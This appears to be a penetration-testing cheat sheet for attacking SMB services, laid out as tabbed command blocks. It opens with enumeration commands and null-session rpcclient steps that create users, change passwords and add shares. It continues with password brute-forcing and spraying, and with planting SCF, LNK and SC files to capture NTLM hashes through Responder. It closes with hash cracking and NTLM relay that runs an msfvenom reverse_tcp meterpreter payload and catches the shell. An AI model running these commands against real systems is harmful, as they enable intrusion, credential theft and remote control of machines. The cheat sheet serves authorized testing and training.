---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SMB (139, 445)

## Basic Commands

### SMBMap

{% tabs %}
{% tab title="Shares & Perms" %}
```bash
smbmap -H 10.10.10.10
```
{% endtab %}

{% tab title="Dirs" %}
```bash
smbmap -H 10.10.10.10 -r share1
```
{% endtab %}

{% tab title="Download" %}
```bash
smbmap -H 10.10.10.10 --download "share1\file1"
```
{% endtab %}

{% tab title="Upload" %}
```bash
smbmap -H 10.10.10.10 --upload file1 "share1\file1"
```
{% endtab %}
{% endtabs %}

### SMBClient

{% tabs %}
{% tab title="Shares" %}
```bash
smbclient -N -L //10.10.10.10
```
{% endtab %}

{% tab title="Connect" %}
```bash
smbclient -U user //10.129.42.253/share1
```
{% endtab %}

{% tab title="Download All" %}
```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
{% endtab %}
{% endtabs %}

### RPC

{% tabs %}
{% tab title="Connect" %}
```bash
# NULL session
rpcclient -U -N "" 10.10.10.10
```
{% endtab %}

{% tab title="SysInfo" %}
```bash
srvinfo
```
{% endtab %}

{% tab title="Users" %}
```bash
enumdomusers
```
{% endtab %}

{% tab title="Groups" %}
```bash
enumalsgroups
```
{% endtab %}

{% tab title="Domains" %}
```bash
enumdomains
```
{% endtab %}

{% tab title="All" %}
```bash
netshareenumall
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Local Groups" %}
```bash
enumalsgroups builtin
```
{% endtab %}

{% tab title="Privileges" %}
```bash
enumprivs
```
{% endtab %}

{% tab title="SID" %}
```bash
lookupnames user
```
{% endtab %}

{% tab title="User Info" %}
```bash
queryuser RID
```
{% endtab %}

{% tab title="Pass Pol" %}
```bash
getusrdompwinfo 1000
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="New User" %}
```bash
# create user
createdomuser user1
# set new password
setuserinfo2 user1 24 'Pass123!'
```
{% endtab %}

{% tab title="New Share" %}
```bash
netshareadd "C:\Windows" "Windows" 10 "Share1"
```
{% endtab %}

{% tab title="Change Pass" %}
<pre class="language-bash"><code class="lang-bash">setuserinfo2 &#x3C;USER> 23 'ComplexP4ssw0rd!'
# or
<strong>chgpasswd3 &#x3C;USER> &#x3C;OLD-PASS> &#x3C;NEW-PASS>
</strong></code></pre>
{% endtab %}
{% endtabs %}

### Metasploit

{% tabs %}
{% tab title="Version" %}
```bash
$ msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.0.24
msf6 auxiliary(scanner/smb/smb_version) > run
```
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}

### Operations

{% tabs %}
{% tab title="NSEs" %}
```bash
sudo nmap -sV -p 139,445 -script smb* 10.10.10.10
```
{% endtab %}

{% tab title="Mount" %}
<pre class="language-bash"><code class="lang-bash"><strong>sudo mount -t cifs //10.10.10.10/share1 /mnt
</strong></code></pre>
{% endtab %}

{% tab title="Mount (auth)" %}
{% code overflow="wrap" %}
```bash
sudo mount -t cifs -o username=<USER>,password=<PASS> //<TARGET-IP>/"<SHARE>" <PATH-TO-MOUNT>
```
{% endcode %}
{% endtab %}

{% tab title="List Dir Perms" %}
```bash
smbcacls -N '//10.10.10.10/share1' /dir1
```
{% endtab %}

{% tab title="List Perms Recur" %}
{% code overflow="wrap" %}
```bash
$ for i in $(ls); do echo $i; smbcacls -N '//10.10.10.103/share1' /dir1/$i ; done
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="1. Server" %}
```bash
impacket-smbserver -smb2support share . -username test -password tes
```
{% endtab %}

{% tab title="2. Connect" %}
```powershell
net use x: \\10.10.14.4\share /USER:test test
```
{% endtab %}

{% tab title="3. Transfer" %}
```powershell
copy file1 x:\
```
{% endtab %}
{% endtabs %}

### Other

{% tabs %}
{% tab title="Enum (1)" %}
```bash
/opt/enum4linux-ng/enum4linux-ng.py 172.16.10.3 -A
```
{% endtab %}

{% tab title="Enum (2)" %}
```bash
/opt/impacket/examples/samrdump.py 172.16.10.3
```
{% endtab %}

{% tab title="Version" %}
```bash
msf6 > useuse auxiliary/scanner/smb/smb_version
```
{% endtab %}

{% tab title="User Enum" %}
<pre class="language-bash"><code class="lang-bash"><strong>msf6 > useuse auxiliary/scanner/smb/smb_login
</strong></code></pre>
{% endtab %}
{% endtabs %}

## Attacks

### Passwords

{% tabs %}
{% tab title="BFA" %}
```bash
hydra -L user.list -P password.list smb://172.16.10.3
```
{% endtab %}

{% tab title="Spray (Domain)" %}
```bash
nxc smb 172.16.10.3 -u users.lst -p Password123! --continue-on-success
```
{% endtab %}

{% tab title="Spray (Local)" %}
{% code overflow="wrap" %}
```bash
nxc smb 172.16.10.3 -u users.lst -p Password123! --continue-on-success --local-auth
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Hashes

All described methods (SCF, LNL, SC) require `WRITE` access to a share/directory.

* If `WRITE` access to a share is available, [NetExec](../../../tools/tools/active-directory/netexec-cme.md) modules can be used for automation.
* If `WRITE` access is only available within a `READABLE` share, the process must be done manually.

For stealing the hash, **the user must only browse the share, not interact with the file**. Finally, the Metasploit's `auxiliary/server/capture/smb` module can be used instead of Responder.

#### SCF

If `WRITE` access to the `Users` share is available.

{% tabs %}
{% tab title="1. Create SCF" %}
{% code overflow="wrap" %}
```bash
nxc smb <TARGET-IP> -u 'guest' -p '' -M scuffy -o NAME=README SERVER=<SMB-SERVER-IP>
```
{% endcode %}
{% endtab %}

{% tab title="2. Listen" %}
<pre class="language-bash"><code class="lang-bash"><strong>sudo responder -I tun0
</strong></code></pre>
{% endtab %}

{% tab title="3. Clean" %}
{% code overflow="wrap" %}
```bash
nxc smb <TARGET-IP> -u 'guest' -p '' -M scuffy -o NAME=README SERVER=<SMB-SERVER-IP> CLEANUP=True
```
{% endcode %}
{% endtab %}
{% endtabs %}

The example below assumes that the share is [locally mounted](smb-139-445.md#operations) and `WRITE` access is available for the `SMB/Users/WritableDir` folder, but not for the `Users` share.

{% tabs %}
{% tab title="1. Create SCF" %}
```bash
[Shell]
Command=2
IconFile=\\10.10.10.10\share\test.io
[Taskbar]
Command=ToggleDesktop
```
{% endtab %}

{% tab title="2. Listen" %}
```bash
sudo responder -I tun0
```
{% endtab %}

{% tab title="3. Transfer" %}
```bash
sudo cp example.scf SMB/Users/WritableDir
```
{% endtab %}
{% endtabs %}

#### LNK

{% tabs %}
{% tab title="1. Uploiad LNK" %}
{% code overflow="wrap" %}
```bash
nxc smb 172.16.10.3 -u user1 -p user1_pass -M slinky -o SERVER=10.10.10.10 NAME=README
```
{% endcode %}
{% endtab %}

{% tab title="2. Listen" %}
```bash
sudo responder -I tun0
```
{% endtab %}

{% tab title="3. Clean" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>nxc smb 172.16.10.3 -u user1 -p user1_pass -M slinky -o NAME=README CLEANUP=YES
</strong></code></pre>
{% endtab %}
{% endtabs %}

#### SC

Similar to [LNK](smb-139-445.md#lnk), but the URL needs to be escaped with `\\` and by default it writes the file `Documents` in all writable shares.

{% tabs %}
{% tab title="1. Uploiad SC" %}
{% code overflow="wrap" %}
```bash
nxc smb 172.16.10.3 -u user1 -p user1_pass -M drop-sc -o URL=\\\\2.2.2.2\\secret SHARE=share1 FILENAME=README
```
{% endcode %}
{% endtab %}

{% tab title="2. Listen" %}
```bash
sudo responder -I tun0
```
{% endtab %}

{% tab title="3. Clean" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>nxc smb 172.16.10.3 -u user1 -p user1_pass -M drop-sc -o CLEANUP=True FILENAME=README
</strong></code></pre>
{% endtab %}
{% endtabs %}

Once a hash is obtained it can be cracked or relayed.

{% tabs %}
{% tab title="Crack" %}
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou
```
{% endtab %}

{% tab title="Relay" %}
[#ntlm-relay](smb-139-445.md#ntlm-relay "mention")
{% endtab %}
{% endtabs %}

### NTLM Relay

{% tabs %}
{% tab title="1. Enum" %}
```bash
nxc smb 172.16.10.0/24 --gen-relay-list relay.txt
```
{% endtab %}

{% tab title="2. Payload" %}
{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=5555 -f exe > shell.exe
```
{% endcode %}
{% endtab %}

{% tab title="3. Server" %}
```bash
sudo impacket-ntlmrelayx.py -h relay.txt -e ./shell.exe
```
{% endtab %}

{% tab title="4. Meterpreter" %}
```bash
msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.10.10
msf6 exploit(multi/handler) > set LPORT 5555
msf6 exploit(multi/handler) > exploit
```
{% endtab %}

{% tab title="5. Migrate" %}
```bash
meterpreter > ps
meterpreter > migrate <PID>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="1. Enum" %}
```bash
nxc smb 172.16.10.0/24 --gen-relay-list relay.txt
```
{% endtab %}

{% tab title="2. MSF" %}
```bash
msf6 > use exploit/windows/smb/smb_relay
msf6 exploit(windows/smb/smb_relay) > set relay_targets
msf6 exploit(windows/smb/smb_relay) > set srvhost 172.16.10.3
msf6 exploit(windows/smb/smb_relay) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/smb_relay) > set LHOST 10.10.10.10
msf6 exploit(windows/smb/smb_relay) > exploit
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="1. Enum" %}
```bash
nxc smb 172.16.10.0/24 --gen-relay-list relay.txt
```
{% endtab %}

{% tab title="2. Relay" %}
```bash
sudo impacket-ntlmrelayx.py -tf relay.txt -smb2support --no-http
```
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="Search Connectors" %}
{% embed url="https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/" %}
{% endtab %}

{% tab title="SCF File Attacks" %}
{% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}
{% endtab %}
{% endtabs %}
